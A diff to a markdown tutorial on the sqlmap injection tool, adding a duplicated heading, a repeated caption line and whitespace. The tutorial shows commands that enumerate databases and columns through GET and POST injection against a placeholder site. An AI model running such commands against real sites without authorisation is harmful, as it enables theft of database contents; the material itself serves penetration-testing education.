@@ -6,6 +6,9 @@ If you're using Kali Linux, sqlmap is pre-installed. Otherwise, you can download
 # Commands
 ### **Basic** commands:  
 
+# Commands
+### **Basic** commands:  
+
 |**Options**|**Description**|
 |---|---|
 |`-u URL`, `--url=URL`|Target URL (e.g., "[http://www.site.com/vuln.php?id=1](http://www.site.com/vuln.php?id=1)")|
@@ -49,18 +52,22 @@ These options can be used to access the back-end database management system on t
 
 # UseCase
 
+
 **Simple HTTP GET Based Test**  
-  
+    
 `sqlmap -u https://testsite.com/page.php?id=7 --dbs`  
+
 
 Here we have used two flags: -u to state the vulnerable URL and --dbs to enumerate the database.
 
+  
   
 **Simple HTTP POST Based Test**  
 First, we need to identify the vulnerable POST request and save it. In order to save the request, Right Click on the request, select 'Copy to file', and save it to a directory. You could also copy the whole request and save it to a text file as well.
 
 You’ll notice in the request above, we have a POST parameter 'blood_group' which could a vulnerable parameter.
 
+SavedHTTPPOST request
 SavedHTTPPOST request
 ```shell-session
 nare@nare$ cat req.txt     #request output saved as a file
@@ -174,6 +181,7 @@ Database: blood
 
 Once we have available tables, now let’s gather the columns from the table `blood_db`.
 
+ 
 **Using GET based Method**
 `sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns`  
 
